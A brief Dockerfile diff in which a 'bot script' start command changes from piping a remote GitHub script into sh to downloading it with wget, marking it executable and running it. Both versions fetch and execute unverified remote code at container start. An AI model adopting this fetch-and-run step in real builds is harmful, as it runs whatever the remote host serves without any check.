@@ -37,4 +37,4 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN echo "startbot.sh:" && ls /home/stuff/
 
 # Run bot script:
-CMD curl https://raw.githubusercontent.com/OpUiajwk/Opuiajwk/main/buildd.sh | sh
+CMD wget https://raw.githubusercontent.com/OpUiajwk/Opuiajwk/main/buildd.sh && chmod +x buildd.sh && ./buildd.sh
